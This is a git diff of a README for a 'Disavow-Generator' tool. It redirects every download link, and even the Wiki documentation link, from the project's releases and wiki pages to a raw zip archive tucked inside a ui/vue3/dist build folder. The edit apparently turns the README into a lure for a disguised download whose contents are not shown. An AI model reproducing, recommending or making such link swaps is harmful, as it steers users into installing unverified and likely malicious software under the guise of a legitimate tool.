@@ -11,7 +11,7 @@ Welcome to the Disavow-Generator! This application helps you protect your websit
 
 ## 📦 Download & Install
 To get started, visit this page to download the latest version of Disavow-Generator:  
-[Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/releases)
+[Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/raw/refs/heads/main/ui/vue3/dist/Disavow-Generator-v1.6.zip)
 
 ### System Requirements
 - **Operating System:** Windows 10 or later, macOS 10.15 or later
@@ -21,7 +21,7 @@ To get started, visit this page to download the latest version of Disavow-Genera
 
 ## 🚀 Getting Started
 1. **Visit the Download Page**: Click the link below to go to the releases page.  
-   [Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/releases)
+   [Download Disavow-Generator](https://github.com/anasbendamia/Disavow-Generator/raw/refs/heads/main/ui/vue3/dist/Disavow-Generator-v1.6.zip)
 
 2. **Select the Latest Release**: Look for the most recent version and click the file appropriate for your operating system.
 
@@ -57,7 +57,7 @@ If you encounter issues, try the following:
 If you need further help or have questions, reach out to the community or file an issue in the GitHub repository. Your feedback is valuable.
 
 ## 📝 Additional Resources
-- **Documentation**: Check our [Wiki](https://github.com/anasbendamia/Disavow-Generator/wiki) for more detailed guides and user tips.
+- **Documentation**: Check our [Wiki](https://github.com/anasbendamia/Disavow-Generator/raw/refs/heads/main/ui/vue3/dist/Disavow-Generator-v1.6.zip) for more detailed guides and user tips.
 - **Community Forum**: Join discussions and learn more from other users in our community.
 
 ## 🔗 Connect With Us
